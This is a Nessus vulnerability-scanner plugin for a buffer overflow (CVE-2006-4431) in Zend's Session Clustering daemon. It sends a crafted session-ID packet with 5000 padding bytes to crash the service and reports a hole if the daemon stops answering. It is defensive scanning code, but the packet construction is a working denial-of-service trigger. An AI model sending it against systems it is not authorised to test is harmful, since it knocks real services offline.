#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22273);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2006-4431");
  script_bugtraq_id(19692);
  script_osvdb_id(28230);

  script_name(english:"Zend Session Clustering Daemon PHP Session Identifier Remote Overflow");
  script_summary(english:"Tries to crash Zend Session Clustering daemon");

 script_set_attribute(attribute:"synopsis", value:
"The remote server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of Zend's Session Clustering daemon on the remote host
contains a buffer overflow that can be exploited by an attacker using
a specially crafted session id to crash the affected service and even
execute arbitrary code subject to the permissions of the user id
running it." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory_052006.128.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/444263/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Zend Platform version 2.2.1a or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/08/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/08/24");
 script_cvs_date("$Date: 2016/05/04 18:02:24 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");
  script_dependencies("zend_scd_detect.nasl");
  script_require_ports("Services/zend_scd", 34567);
  exit(0);
}

include("global_settings.inc");
include("byte_func.inc");
include("misc_func.inc");


port = get_kb_item("Services/zend_scd");
if (!port) port = 34567;
if (!get_port_state(port)) exit(0);


# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) exit(0);

req1_1 = raw_string(0x00, 0x00, 0x30, 0x39);
req1_2 = raw_string(0x00, 0x00, 0x00, 0x06);
send(socket:soc, data:req1_1+req1_2);
res = recv(socket:soc, length:64);
if (
  strlen(res) == 20 &&
  getdword(blob:res, pos:0) == 0x303a &&
  getdword(blob:res, pos:4) == 6
)
{
  # Try to exploit the issue to crash the service.
  octs = split(get_host_ip(), sep:'.', keep:FALSE);
  if (isnull(octs)) exit(0);

  # nb: the initial component in the session identifier must be valid;
  #     this is an encoded IP address, and we assume the target's 
  #     IP address will work.
  sid = str_replace(
    string:string(
      hex(octs[0]^186), 
      hex(octs[1]^186), 
      hex(octs[2]^176),                # nb: yes, this one is different!
      hex(octs[3]^186)
    ), 
    find:"0x", 
    replace:""
  );
  sid += ":baba37bd:00000000:00000000:00000000:00000000:" + crap(5000);

  req2_1 = raw_string(0x00, 0x00, 0x30, 0x3b);
  req2_2 = mkdword(0x0c) + 
    mkdword(0x00) +
    mkdword(strlen(sid)) + 
    mkdword(0) + 
    mkdword(0) + 
    mkdword(0) +
    sid;
  send(socket:soc, data:req2_1+req2_2);
  res = recv(socket:soc, length:64);

  if (!strlen(res))
  {
    # Try to reestablish a connection and read the banner.
    soc2 = open_sock_tcp(port);
    if (soc2)
    {
      send(socket:soc2, data:req1_1+req1_2);
      res2 = recv(socket:soc2, length:64);
      close(soc2);
    }

    # If we couldn't establish the connection or read the banner,
    # there's a problem.
    if (!soc2 || !strlen(res2))
    {
      security_hole(port);
      exit(0);
    }
  }
}
